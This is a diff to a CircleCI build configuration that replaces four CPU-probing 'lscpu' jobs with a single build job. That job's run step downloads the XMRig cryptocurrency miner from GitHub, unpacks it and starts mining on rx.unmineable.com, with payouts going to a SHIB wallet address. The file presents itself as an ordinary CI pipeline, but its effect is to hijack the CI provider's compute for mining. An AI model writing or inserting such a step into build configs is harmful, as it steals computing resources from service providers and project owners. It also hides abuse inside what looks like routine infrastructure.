@@ -1,38 +1,11 @@
-version: 2.1
+version: 2.0
 jobs:
-    Devop:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop2:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop3:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-workflows:
-    version: 2.1
-    build:
-        jobs:
-            - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -zxvf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u SHIB:0xf6114d1ba3f957c361b53d7fba88a4df2706bcae.mypcrig
